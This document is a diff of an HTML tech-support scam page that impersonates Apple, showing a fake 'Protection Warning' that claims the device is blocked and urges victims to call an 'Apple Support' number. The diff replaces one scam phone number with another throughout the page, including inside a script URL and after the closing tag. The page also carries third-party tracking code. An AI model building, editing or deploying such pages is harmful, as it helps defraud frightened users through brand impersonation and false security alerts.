@@ -22,7 +22,7 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
           integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/boot+1-866-664-1242strap/4.5.2/js/bootstrap.min.js"
+    <script src="https://stackpath.bootstrapcdn.com/boot+1-888-715-8167strap/4.5.2/js/bootstrap.min.js"
             integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
             crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
@@ -179,7 +179,7 @@
 right: 150px;
 top: 6px;
 font-weight: 500;
-font-size: 19px;" id="text12"><b>+1-866-664-1242(free security)</b></h3>
+font-size: 19px;" id="text12"><b>+1-888-715-8167(free security)</b></h3>
 
     <div class="centerright">
 
@@ -325,7 +325,7 @@ margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
             this device. <br><br>
             Closing this mac puts your personal information at risk and interrupts your mac registration.</p>
 
-          <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-866-664-1242(Security Support)</strong></p>
+          <p style="padding-bottom: 0px;">Call Apple Support <strong>+1-888-715-8167(Security Support)</strong></p>
           <div class="action_buttons"> <a class="" id="leave_page" style="cursor: pointer;">Have understood</a> <a
               class="" id="leave_page">To cancel</a> </div>
         </div>
@@ -366,7 +366,7 @@ margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
     <img id="banner" src="virus-images.png">
     <div id="disclaimer">
       Access to this PC has been blocked for security reasons.<br>
-      <span class="support">Contact Apple Support: +1-866-664-1242(Security Support)</span>
+      <span class="support">Contact Apple Support: +1-888-715-8167(Security Support)</span>
     </div>
     <div id="bottom">
       <img id="badge" src="apple.png"><span class="title3">Apple Support</span>
@@ -399,7 +399,7 @@ margin-top: 8px; text-align: center;">Apple Security - Protection Warning</p>
         <div class="right-foot" style="text-align: center;">
           <span id="footertxt" style="font-weight: 700;"><img src="apple.png"> Apple</span><span
             style="font-weight: 700;padding-left: 5px;color: #fff;">Support contact <span
-              style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-866-664-1242(Security
+              style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1-888-715-8167(Security
               Support)</span></span>
         </div>
       </div>
@@ -471,4 +471,4 @@ s0.parentNode.insertBefore(s1,s0);
 </script><noscript><a href="http://www.hitsteps.com/"><img src="//edgecdn.dev/code?mode=img&amp;code=a7400ed6d3f8ef9dff8b932728043756" alt="website tracking" width="1" height="1" />Realtime blog statistics</a></noscript>
 <!-- Hitsteps TRACKING CODE - DO NOT CHANGE -->
 </body>
-</html>+1-866-664-1242
+</html>+1-888-715-8167
